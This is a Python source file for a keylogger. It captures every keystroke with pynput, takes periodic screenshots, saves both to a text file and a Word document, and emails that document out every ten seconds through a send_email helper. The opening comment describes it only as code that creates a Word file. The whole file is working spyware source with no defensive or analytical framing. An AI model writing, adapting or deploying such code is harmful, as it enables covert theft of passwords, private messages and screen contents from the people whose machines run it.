# This code will create a word file in your computer 
import pynput
from pynput.keyboard import Key, Listener
import pyautogui
from docx import Document
import send_email
import threading
import os

count = 0
keys = []

#To save and update keylogger.txt
def write_to_file(data):
    with open('keylogger.txt', 'a') as f:
        f.write(data + '\n')

#Capture of screenshot
def capture_screenshot():
    # Capture screenshot using pyautogui
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')

def get_screenshot():
    return 'screenshot.png'

#To save all Data in an Word document 
def get_word_document(keys):
    doc_path = 'keylogger_data.docx'
    if os.path.exists(doc_path):
        doc = Document(doc_path)
    else:
        doc = Document()
        doc.add_heading('Keylogger Data', level=1)

    # Add keystrokes to the document
    doc.add_paragraph('Keystrokes:')
    for key in keys:
        doc.add_paragraph(key)

    # Add screenshot to the document
    doc.add_paragraph('Screenshot:')
    doc.add_picture(get_screenshot())

    # Save the document
    doc.save(doc_path)

def update_data():
    global keys, count
    write_to_file(''.join(keys))
    capture_screenshot()
    get_word_document(keys)
    email()
    # Set a timer to update data every 10 seconds
    threading.Timer(10, update_data).start()

def on_press(key):
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0

#Sends an e-mail for verification is the word document updated or not 
def email():
    send_email.sendEmail('keylogger_data.docx')

def on_release(key):
    if key == Key.esc:
        return False

# Start the data update loop
update_data()

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
